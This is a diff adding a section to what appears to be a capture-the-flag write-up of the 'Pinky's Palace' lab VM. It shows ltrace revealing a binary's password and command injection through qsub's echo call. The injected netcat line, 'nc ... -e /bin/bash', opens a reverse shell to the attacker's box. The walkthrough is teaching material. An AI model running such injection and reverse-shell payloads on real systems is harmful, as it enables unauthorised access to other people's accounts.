@@ -716,6 +716,17 @@ Running strings against qsub provides some information but no obvious passwords 
 ```
 root@kali:~/Downloads# strings qsub
 ---SNIP---
+puts
+strlen
+send
+setresgid
+asprintf
+getenv
+setresuid
+system
+getegid
+geteuid
+---SNIP---
 /bin/echo %s >> /home/pinky/messages/stefano_msg.txt
 %s <Message>
 TERM
@@ -728,6 +739,63 @@ GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
 ---SNIP---
 ```
 
+Running qsub using ltrace (on my 64bit Kali Linux virtual machine) revealed that the password is taken from the `TERM` environmental variable and is `xterm-256color`.
+```
+root@kali:~/Desktop# ltrace ./qsub test
+getenv("TERM")                                   = "xterm-256color"
+printf("[+] Input Password: ")                   = 20
+__isoc99_scanf(0x55a6f5d15cb5, 0x7ffc3d9d8160, 0x7f66d45ca760, 0xfbad2a84[+] Input Password: test2
+) = 1
+strlen("test2")                                  = 5
+strcmp("test2", "xterm-256color")                = -4
+puts("[!] Incorrect Password!"[!] Incorrect Password!
+)                  = 24
+exit(0 <no return ...>
++++ exited (status 0) +++
+```
+
+Now to send a message to pinky.
+
+```
+stefano@Pinkys-Palace://home/stefano/tools$ ./qsub Hello from stefano!
+[+] Input Password: xterm-256color
+[+] Welcome to Question Submit!
+```
+
+## Running commands as Pinky
+
+Based on the `strings` contents of `qsub` and it's use of `/bin/echo`, it appears we can inject arbitrary bash commands in our message to pinky.
+```
+/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
+```
+
+By substituting the `%s` with `&& nc -nv 192.168.225.129 4444 -e /bin/bash`, a reverse shell can be created into Pinky's account.
+```
+/bin/echo Test && nc -nv 192.168.225.129 4444 -e /bin/bash >> /home/pinky/messages/stefano_msg.txt
+```
+
+Setup the netcat listner on my Kali box:
+```
+root@kali:~/Downloads# nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Trigger the reverse shell using qsub and wrap the single quotes otherwise the `&&` is going to create problems. 
+```
+stefano@Pinkys-Palace://home/stefano/tools$ ./qsub 'Test && nc -nv 192.168.225.129 4444 -e /bin/bash'
+[+] Input Password: xterm-256color
+Test
+(UNKNOWN) [192.168.225.129] 4444 (?) open
+```
+
+And we have a reverse shell for the user pinky!
+```
+connect to [192.168.225.129] from (UNKNOWN) [192.168.225.130] 57460
+id
+uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
+```
+
+## Pinky user access Enumeration
 
 
 
